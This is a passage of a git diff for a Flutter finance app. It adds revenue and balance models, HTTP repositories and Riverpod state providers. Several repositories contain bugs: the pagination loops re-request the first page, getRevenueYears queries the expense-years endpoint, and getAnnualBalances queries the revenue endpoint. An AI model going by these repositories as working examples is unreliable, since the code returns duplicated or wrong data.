a\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/jwt_model.dart b\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/jwt_model.dart\nindex 82d8a84..ddbd8bc 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/jwt_model.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/jwt_model.dart\n@@ -3,7 +3,7 @@ import 'package:json_annotation\/json_annotation.dart';\n \n part 'jwt_model.g.dart';\n \n-@JsonSerializable()\n+@JsonSerializable(fieldRename: FieldRename.snake)\n class JwtModel extends Equatable {\n   \n   final String access;\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/register\/data\/models\/register_model.dart b\/frontend\/flutter\/lib\/src\/features\/register\/data\/models\/register_model.dart\nindex 4be7a33..9c461f6 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/register\/data\/models\/register_model.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/register\/data\/models\/register_model.dart\n@@ -3,15 +3,13 @@ import 'package:json_annotation\/json_annotation.dart';\n \n part 'register_model.g.dart';\n \n-@JsonSerializable()\n+@JsonSerializable(fieldRename: FieldRename.snake)\n class RegisterModel extends Equatable {\n \n   final String username;\n   final String email;\n   final String language;\n-  @JsonKey(name: 'inv_code')\n   final String invCode;\n-  @JsonKey(name: 'pref_coin_type')\n   final String prefCoinType;\n   final String password;\n   final String password2;\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/models\/revenue_model.dart b\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/models\/revenue_model.dart\nnew file mode 100644\nindex 0000000..2044664\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/models\/revenue_model.dart\n@@ -0,0 +1,38 @@\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/models\/revenue_type_model.dart';\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'revenue_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class RevenueModel extends Equatable {\n+\n+  final int id;\n+  final String name;\n+  final String description;\n+  final double quantity;\n+  final DateTime date;\n+  final String coinType;\n+  final RevenueTypeModel revType;\n+\n+  const RevenueModel({\n+    required this.id,\n+    required this.name,\n+    required this.description,\n+    required this.quantity,\n+    required this.date,\n+    required this.coinType,\n+    required this.revType,\n+  });\n+\n+  \/\/ Json Serializable\n+  factory RevenueModel.fromJson(Map<String, dynamic> json) =>\n+    _$RevenueModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$RevenueModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [\n+    id\n+  ];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/models\/revenue_type_model.dart b\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/models\/revenue_type_model.dart\nnew file mode 100644\nindex 0000000..7cb9090\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/models\/revenue_type_model.dart\n@@ -0,0 +1,27 @@\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'revenue_type_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class RevenueTypeModel extends Equatable {\n+\n+  final String name;\n+  final String image;\n+  \n+  const RevenueTypeModel({\n+    required this.name,\n+    required this.image,\n+  });\n+\n+  \/\/ Json Serializable\n+  factory RevenueTypeModel.fromJson(Map<String, dynamic> json) =>\n+    _$RevenueTypeModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$RevenueTypeModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [\n+    name\n+  ];\n+}\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/repositories\/revenue_repository.dart b\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/repositories\/revenue_repository.dart\nnew file mode 100644\nindex 0000000..4bd9c4f\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/repositories\/revenue_repository.dart\n@@ -0,0 +1,93 @@\n+import 'package:balance_home_app\/src\/core\/data\/models\/balance_years_model.dart';\n+import 'package:balance_home_app\/src\/core\/data\/models\/pagination_model.dart';\n+import 'package:balance_home_app\/src\/core\/services\/api_contract.dart';\n+import 'package:balance_home_app\/src\/core\/services\/http_service.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/models\/revenue_model.dart';\n+\n+abstract class IRevenueRepository {\n+  Future<RevenueModel> getRevenue(int id);\n+\n+  Future<List<RevenueModel>> getRevenues({\n+    DateTime? dateFrom,\n+    DateTime? dateTo\n+  });\n+\n+  Future<List<int>> getRevenueYears();\n+  \n+  Future<void> createRevenue(RevenueModel revenue);\n+  \n+  Future<void> updateRevenue(RevenueModel revenue);\n+}\n+\n+class RevenueRepository implements IRevenueRepository {\n+\n+  final HttpService httpService;\n+\n+  RevenueRepository({required this.httpService});\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch a revenue.\n+  @override\n+  Future<RevenueModel> getRevenue(int id) async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.revenue}\/${id.toString()}'\n+    );\n+    return RevenueModel.fromJson(response.content);\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch all revenues.\n+  @override\n+  Future<List<RevenueModel>> getRevenues({\n+    DateTime? dateFrom,\n+    DateTime? dateTo\n+  }) async {\n+    String extraArgs = \"\";\n+    if (dateFrom != null) {\n+      extraArgs += \"&date_from=${dateFrom.year}-${dateFrom.month}-${dateFrom.day}\";\n+    }\n+    if (dateTo != null) {\n+      extraArgs += \"&date_to=${dateTo.year}-${dateTo.month}-${dateTo.day}\";\n+    }\n+    int pageNumber = 1; \n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.revenue}?page=$pageNumber$extraArgs'\n+    );\n+    PaginationModel page = PaginationModel.fromJson(response.content);\n+    List<RevenueModel> revenues = page.results.map((e) => RevenueModel.fromJson(e)).toList();\n+    while (page.next != null) {\n+      HttpResponse response = await httpService.sendGetRequest(\n+        '${APIContract.revenue}?page=$pageNumber$extraArgs'\n+      );\n+      page = PaginationModel.fromJson(response.content);\n+      revenues += page.results.map((e) => RevenueModel.fromJson(e)).toList();\n+      pageNumber ++;\n+    }\n+    return revenues;\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch all years with revenues.\n+  @override\n+  Future<List<int>> getRevenueYears() async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      APIContract.expenseYears\n+    );\n+    return BalanceYearsModel.fromJson(response.content).years;\n+  }\n+\n+  \/\/\/ Sends a [POST] request to backend service to create an revenue.\n+  @override\n+  Future<void> createRevenue(RevenueModel revenue) async {\n+    await httpService.sendPostRequest(\n+      '${APIContract.revenue}\/${revenue.id.toString()}',\n+      revenue.toJson()\n+    );\n+  }\n+\n+  \/\/\/ Sends a [PUT] request to backend service to update an revenue.\n+  @override\n+  Future<void> updateRevenue(RevenueModel revenue) async {\n+    await httpService.sendPutRequest(\n+      '${APIContract.revenue}\/${revenue.id.toString()}',\n+      revenue.toJson()\n+    );\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/repositories\/revenue_type_respository.dart b\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/repositories\/revenue_type_respository.dart\nnew file mode 100644\nindex 0000000..34d78b4\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/revenue\/data\/repositories\/revenue_type_respository.dart\n@@ -0,0 +1,46 @@\n+import 'package:balance_home_app\/src\/core\/data\/models\/pagination_model.dart';\n+import 'package:balance_home_app\/src\/core\/services\/api_contract.dart';\n+import 'package:balance_home_app\/src\/core\/services\/http_service.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/models\/revenue_type_model.dart';\n+\n+abstract class IRevenueTypeRepository {\n+  Future<RevenueTypeModel> getRevenueType(String code);\n+\n+  Future<List<RevenueTypeModel>> getRevenueTypes();\n+}\n+\n+class RevenueTypeRepository implements IRevenueTypeRepository {\n+\n+  final HttpService httpService;\n+\n+  RevenueTypeRepository({required this.httpService});\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch an revenue type.\n+  @override\n+  Future<RevenueTypeModel> getRevenueType(String name) async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.revenueType}\/$name'\n+    );\n+    return RevenueTypeModel.fromJson(response.content);\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch all revenue types.\n+  @override\n+  Future<List<RevenueTypeModel>> getRevenueTypes() async {\n+    int pageNumber = 1; \n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.revenueType}?page=$pageNumber'\n+    );\n+    PaginationModel page = PaginationModel.fromJson(response.content);\n+    List<RevenueTypeModel> revenueTypes = page.results.map((e) => RevenueTypeModel.fromJson(e)).toList();\n+    while (page.next != null) {\n+      HttpResponse response = await httpService.sendGetRequest(\n+        '${APIContract.revenueType}?page=$pageNumber'\n+      );\n+      page = PaginationModel.fromJson(response.content);\n+      revenueTypes += page.results.map((e) => RevenueTypeModel.fromJson(e)).toList();\n+      pageNumber ++;\n+    }\n+    return revenueTypes;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/revenue\/logic\/providers\/revenue_provider.dart b\/frontend\/flutter\/lib\/src\/features\/revenue\/logic\/providers\/revenue_provider.dart\nnew file mode 100644\nindex 0000000..26dff5c\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/revenue\/logic\/providers\/revenue_provider.dart\n@@ -0,0 +1,19 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/http_service_provider.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/repositories\/revenue_repository.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/repositories\/revenue_type_respository.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+\/\/\/ Revenue type repository\n+final revenueTypeRepositoryProvider = Provider<IRevenueTypeRepository>(\n+  (ProviderRef<IRevenueTypeRepository> ref) => RevenueTypeRepository(\n+    httpService: ref.read(httpServiceProvider)\n+  )\n+);\n+\n+\/\/\/ Revenue repository\n+final revenueRepositoryProvider = Provider<IRevenueRepository>(\n+  (ProviderRef<IRevenueRepository> ref) => RevenueRepository(\n+    httpService: ref.read(httpServiceProvider)\n+  )\n+);\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/annual_balance_model.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/annual_balance_model.dart\nnew file mode 100644\nindex 0000000..a3989a1\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/annual_balance_model.dart\n@@ -0,0 +1,33 @@\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'annual_balance_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class AnnualBalanceModel extends Equatable {\n+\n+  final double grossQuantity;\n+  final double expectedQuantity;\n+  final String coinType;\n+  final int year;\n+  final DateTime created;\n+\n+  const AnnualBalanceModel({\n+    required this.grossQuantity,\n+    required this.expectedQuantity,\n+    required this.coinType,\n+    required this.year,\n+    required this.created,\n+  });\n+\n+  \/\/ Json Serializable\n+  factory AnnualBalanceModel.fromJson(Map<String, dynamic> json) =>\n+    _$AnnualBalanceModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$AnnualBalanceModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [\n+    year\n+  ];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/monthly_balance_model.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/monthly_balance_model.dart\nnew file mode 100644\nindex 0000000..d5ee35d\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/monthly_balance_model.dart\n@@ -0,0 +1,36 @@\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'monthly_balance_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class MonthlyBalanceModel extends Equatable {\n+\n+  final double grossQuantity;\n+  final double expectedQuantity;\n+  final String coinType;\n+  final int year;\n+  final int month;\n+  final DateTime created;\n+\n+  const MonthlyBalanceModel({\n+    required this.grossQuantity,\n+    required this.expectedQuantity,\n+    required this.coinType,\n+    required this.year,\n+    required this.month,\n+    required this.created,\n+  });\n+\n+  \/\/ Json Serializable\n+  factory MonthlyBalanceModel.fromJson(Map<String, dynamic> json) =>\n+    _$MonthlyBalanceModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$MonthlyBalanceModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [\n+    year,\n+    month\n+  ];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/selected_date_model.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/selected_date_model.dart\nnew file mode 100644\nindex 0000000..6d77804\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/selected_date_model.dart\n@@ -0,0 +1,21 @@\n+import 'package:equatable\/equatable.dart';\n+\n+class SelectedDateModel extends Equatable {\n+\n+  final int day;\n+  final int month;\n+  final int year;\n+\n+  const SelectedDateModel({\n+    required this.day,\n+    required this.month,\n+    required this.year,\n+  });\n+\n+  @override\n+  List<Object?> get props => [\n+    day, \n+    month, \n+    year\n+  ];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/selected_exchange_model.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/selected_exchange_model.dart\nnew file mode 100644\nindex 0000000..ddbc6f2\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/selected_exchange_model.dart\n@@ -0,0 +1,18 @@\n+import 'package:equatable\/equatable.dart';\n+\n+class SelectedExchangeModel extends Equatable {\n+\n+  final String selectedCoinFrom;\n+  final String selectedCoinTo;\n+\n+  const SelectedExchangeModel({\n+    required this.selectedCoinFrom,\n+    required this.selectedCoinTo\n+  });\n+\n+  @override\n+  List<Object?> get props => [\n+    selectedCoinFrom, \n+    selectedCoinTo\n+  ];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/statistics_data_model.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/statistics_data_model.dart\nnew file mode 100644\nindex 0000000..31a453d\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/models\/statistics_data_model.dart\n@@ -0,0 +1,37 @@\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/coin_type_model.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/date_exchanges_list_model.dart';\n+import 'package:balance_home_app\/src\/features\/expense\/data\/models\/expense_model.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/models\/revenue_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/annual_balance_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/monthly_balance_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_date_model.dart';\n+\n+class StatisticsDataModel {\n+  List<RevenueModel> revenues;\n+  List<ExpenseModel> expenses;\n+  List<int> revenueYears;\n+  List<int> expenseYears;\n+  List<MonthlyBalanceModel> monthlyBalances;\n+  List<AnnualBalanceModel> annualBalances;\n+  SelectedDateModel selectedBalanceDate;\n+  SelectedDateModel savingsSelectedDate;\n+  DateExchangesListModel dateExchangesModel;\n+  String selectedCoinFrom;\n+  String selectedCoinTo;\n+  List<CoinTypeModel> coinTypes;\n+\n+  StatisticsDataModel({\n+    required this.revenues,\n+    required this.expenses,\n+    required this.revenueYears,\n+    required this.expenseYears,\n+    required this.monthlyBalances,\n+    required this.annualBalances,\n+    required this.selectedBalanceDate,\n+    required this.savingsSelectedDate,\n+    required this.dateExchangesModel,\n+    required this.selectedCoinFrom,\n+    required this.selectedCoinTo,\n+    required this.coinTypes\n+  });\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/repositories\/annual_balance_repository.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/repositories\/annual_balance_repository.dart\nnew file mode 100644\nindex 0000000..3c20774\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/repositories\/annual_balance_repository.dart\n@@ -0,0 +1,69 @@\n+import 'package:balance_home_app\/src\/core\/data\/models\/pagination_model.dart';\n+import 'package:balance_home_app\/src\/core\/services\/api_contract.dart';\n+import 'package:balance_home_app\/src\/core\/services\/http_service.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/annual_balance_model.dart';\n+\n+abstract class IAnnualBalanceRepository {\n+  Future<AnnualBalanceModel> getAnnualBalance(int id);\n+\n+  Future<List<AnnualBalanceModel>> getAnnualBalances();\n+\n+  Future<List<AnnualBalanceModel>> getLastEightYearsAnnualBalances();\n+}\n+\n+class AnnualBalanceRepository implements IAnnualBalanceRepository {\n+\n+  final HttpService httpService;\n+\n+  AnnualBalanceRepository({required this.httpService});\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch a annual balance.\n+  @override\n+  Future<AnnualBalanceModel> getAnnualBalance(int id) async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.annualBalance}\/${id.toString()}'\n+    );\n+    return AnnualBalanceModel.fromJson(response.content);\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch all annual balances.\n+  @override\n+  Future<List<AnnualBalanceModel>> getAnnualBalances() async {\n+    int pageNumber = 1; \n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.revenue}?page=$pageNumber'\n+    );\n+    PaginationModel page = PaginationModel.fromJson(response.content);\n+    List<AnnualBalanceModel> annualBalances = page.results.map((e) => AnnualBalanceModel.fromJson(e)).toList();\n+    while (page.next != null) {\n+      HttpResponse response = await httpService.sendGetRequest(\n+        '${APIContract.revenue}?page=$pageNumber'\n+      );\n+      page = PaginationModel.fromJson(response.content);\n+      annualBalances += page.results.map((e) => AnnualBalanceModel.fromJson(e)).toList();\n+      pageNumber ++;\n+    }\n+    return annualBalances;\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch last\n+  \/\/\/ 8 years annual balances.\n+  @override\n+  Future<List<AnnualBalanceModel>> getLastEightYearsAnnualBalances() async {\n+    int pageNumber = 1; \n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.annualBalance}?page=$pageNumber'\n+    );\n+    PaginationModel page = PaginationModel.fromJson(response.content);\n+    List<AnnualBalanceModel> annualBalances = page.results.map((e) => AnnualBalanceModel.fromJson(e)).toList();\n+    while (page.next != null && annualBalances.length < 8) {\n+      HttpResponse response = await httpService.sendGetRequest(\n+        '${APIContract.annualBalance}?page=$pageNumber'\n+      );\n+      page = PaginationModel.fromJson(response.content);\n+      annualBalances += page.results.map((e) => AnnualBalanceModel.fromJson(e)).toList();\n+      pageNumber ++;\n+    }\n+    return annualBalances.take(8).toList();\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/repositories\/monthly_balance_repository.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/repositories\/monthly_balance_repository.dart\nnew file mode 100644\nindex 0000000..a62fb59\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/data\/repositories\/monthly_balance_repository.dart\n@@ -0,0 +1,50 @@\n+import 'package:balance_home_app\/src\/core\/data\/models\/pagination_model.dart';\n+import 'package:balance_home_app\/src\/core\/services\/api_contract.dart';\n+import 'package:balance_home_app\/src\/core\/services\/http_service.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/monthly_balance_model.dart';\n+\n+abstract class IMonthlyBalanceRepository {\n+  Future<MonthlyBalanceModel> getMonthlyBalance(int id);\n+\n+  Future<List<MonthlyBalanceModel>> getMonthlyBalances({int? year});\n+}\n+\n+class MonthlyBalanceRepository implements IMonthlyBalanceRepository {\n+\n+  final HttpService httpService;\n+\n+  MonthlyBalanceRepository({required this.httpService});\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch a monthly balance.\n+  @override\n+  Future<MonthlyBalanceModel> getMonthlyBalance(int id) async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.monthlyBalance}\/${id.toString()}'\n+    );\n+    return MonthlyBalanceModel.fromJson(response.content);\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch all monthly balances.\n+  @override\n+  Future<List<MonthlyBalanceModel>> getMonthlyBalances({int? year}) async {\n+    String extraArgs = \"\";\n+    if (year != null) {\n+      extraArgs += \"&year=$year\";\n+    }\n+    int pageNumber = 1; \n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.monthlyBalance}?page=$pageNumber$extraArgs'\n+    );\n+    PaginationModel page = PaginationModel.fromJson(response.content);\n+    List<MonthlyBalanceModel> monthlyBalances = page.results.map((e) => MonthlyBalanceModel.fromJson(e)).toList();\n+    while (page.next != null) {\n+      HttpResponse response = await httpService.sendGetRequest(\n+        '${APIContract.monthlyBalance}?page=$pageNumber$extraArgs'\n+      );\n+      page = PaginationModel.fromJson(response.content);\n+      monthlyBalances += page.results.map((e) => MonthlyBalanceModel.fromJson(e)).toList();\n+      pageNumber ++;\n+    }\n+    return monthlyBalances;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/annual_balance_provider.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/annual_balance_provider.dart\nnew file mode 100644\nindex 0000000..c8044b0\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/annual_balance_provider.dart\n@@ -0,0 +1,11 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/http_service_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/repositories\/annual_balance_repository.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+\/\/\/ Annual balance repository\n+final annualBalanceRepositoryProvider = Provider<IAnnualBalanceRepository>(\n+  (ProviderRef<IAnnualBalanceRepository> ref) => AnnualBalanceRepository(\n+    httpService: ref.read(httpServiceProvider)\n+  )\n+);\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/monthly_balance_provider.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/monthly_balance_provider.dart\nnew file mode 100644\nindex 0000000..0322011\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/monthly_balance_provider.dart\n@@ -0,0 +1,11 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/http_service_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/repositories\/monthly_balance_repository.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+\/\/\/ Monthly balance repository\n+final monthlyBalanceRepositoryProvider = Provider<IMonthlyBalanceRepository>(\n+  (ProviderRef<IMonthlyBalanceRepository> ref) => MonthlyBalanceRepository(\n+    httpService: ref.read(httpServiceProvider)\n+  )\n+);\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_provider.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_provider.dart\nnew file mode 100644\nindex 0000000..03b549e\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_provider.dart\n@@ -0,0 +1,13 @@\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state_notifier.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+final selectedBalanceDateStateNotifierProvider = StateNotifierProvider<SelectedDateModelStateNotifier, SelectedDateModelState>(\n+  (StateNotifierProviderRef<SelectedDateModelStateNotifier, SelectedDateModelState> ref) => \n+    SelectedDateModelStateNotifier()\n+);\n+\n+final selectedSavingsDateStateNotifierProvider = StateNotifierProvider<SelectedDateModelStateNotifier, SelectedDateModelState>(\n+  (StateNotifierProviderRef<SelectedDateModelStateNotifier, SelectedDateModelState> ref) => \n+    SelectedDateModelStateNotifier()\n+);\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state.dart\nnew file mode 100644\nindex 0000000..3543758\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state.dart\n@@ -0,0 +1,9 @@\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_date_model.dart';\n+import 'package:freezed_annotation\/freezed_annotation.dart';\n+\n+part 'selected_date_model_state.freezed.dart';\n+\n+@freezed\n+class SelectedDateModelState with _$SelectedDateModelState {\n+  const factory SelectedDateModelState(SelectedDateModel model) = _SelectedDateModelState;\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state_notifier.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state_notifier.dart\nnew file mode 100644\nindex 0000000..d71ebf1\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state_notifier.dart\n@@ -0,0 +1,50 @@\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_date_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+class SelectedDateModelStateNotifier extends StateNotifier<SelectedDateModelState> {\n+  SelectedDateModelStateNotifier() : \n+    super(\n+      SelectedDateModelState(\n+        SelectedDateModel(\n+          day: DateTime.now().day, \n+          month: DateTime.now().month, \n+          year: DateTime.now().year\n+        )\n+      ));\n+  \n+  void setSelectedDateModel(SelectedDateModel model) {\n+    state = state.copyWith(model: model);\n+  }\n+  \n+  void setDay(int day) {\n+    SelectedDateModel model = SelectedDateModel(\n+      day: day,\n+      month: state.model.month,\n+      year: state.model.year\n+    ); \n+    state = state.copyWith(model: model);\n+  }\n+  \n+  void setMonth(int month) {\n+    SelectedDateModel model = SelectedDateModel(\n+      day: state.model.day,\n+      month: month,\n+      year: state.model.year\n+    ); \n+    state = state.copyWith(model: model);\n+  }\n+  \n+  void setYear(int year) {\n+    SelectedDateModel model = SelectedDateModel(\n+      day: state.model.day,\n+      month: state.model.month,\n+      year: year\n+    ); \n+    state = state.copyWith(model: model);\n+  }\n+\n+  SelectedDateModel? getSelectedDateModel() {\n+    return state.model;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_provider.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_provider.dart\nnew file mode 100644\nindex 0000000..b8b28ff\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_provider.dart\n@@ -0,0 +1,8 @@\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state_notifier.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+final selectedExchangeStateNotifierProvider = StateNotifierProvider<SelectedExchangeModelStateNotifier, SelectedExchangeModelState>(\n+  (StateNotifierProviderRef<SelectedExchangeModelStateNotifier, SelectedExchangeModelState> ref) => \n+    SelectedExchangeModelStateNotifier()\n+);\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state.dart\nnew file mode 100644\nindex 0000000..9947fa4\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state.dart\n@@ -0,0 +1,9 @@\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_exchange_model.dart';\n+import 'package:freezed_annotation\/freezed_annotation.dart';\n+\n+part 'selected_exchange_model_state.freezed.dart';\n+\n+@freezed\n+class SelectedExchangeModelState with _$SelectedExchangeModelState {\n+  const factory SelectedExchangeModelState(SelectedExchangeModel model) = _SelectedExchangeModelState;\n+}\n\\ No newline at end of file\ndiff --git 